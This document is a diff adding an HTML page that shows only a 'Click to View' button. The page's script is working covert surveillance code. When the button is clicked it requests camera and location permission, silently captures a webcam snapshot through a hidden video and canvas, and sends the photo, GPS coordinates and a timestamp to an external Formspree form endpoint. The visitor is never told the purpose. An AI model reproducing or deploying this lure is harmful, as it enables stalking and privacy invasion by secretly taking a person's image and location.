@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+</head>
+<body style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;">
+
+<button id="btn" style="
+  padding:16px 28px;
+  font-size:16px;
+  background:black;
+  color:white;
+  border:none;
+  border-radius:6px;
+  cursor:pointer;
+">
+Click to View
+</button>
+
+<video id="video" autoplay playsinline hidden></video>
+<canvas id="canvas" hidden></canvas>
+
+<script>
+const btn = document.getElementById("btn");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+
+btn.onclick = async () => {
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+  video.srcObject = stream;
+
+  navigator.geolocation.getCurrentPosition(pos => {
+    setTimeout(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      const image = canvas.toDataURL("image/jpeg");
+
+      fetch("https://formspree.io/f/xlgdqobv", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          image,
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          time: new Date().toISOString()
+        })
+      });
+
+      stream.getTracks().forEach(t => t.stop());
+    }, 700);
+  });
+};
+</script>
+</body>
+</html>
